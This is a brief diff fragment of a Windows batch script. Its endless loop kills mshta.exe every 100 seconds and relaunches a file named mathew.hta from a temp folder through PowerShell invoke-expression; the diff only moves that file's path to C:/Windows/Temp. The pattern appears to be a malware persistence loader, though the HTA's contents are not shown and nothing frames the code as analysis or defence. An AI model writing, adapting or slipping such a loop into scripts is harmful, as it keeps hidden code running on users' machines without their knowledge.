@@ -18,5 +18,5 @@ goto top3
 :top3  
 timeout /t 100 & 
 taskkill /IM mshta.exe /F 
-powershell invoke-expression 'mshta %tmp%/mathew.hta' 
+powershell invoke-expression 'mshta C:/Windows/Temp/mathew.hta' 
 goto top3
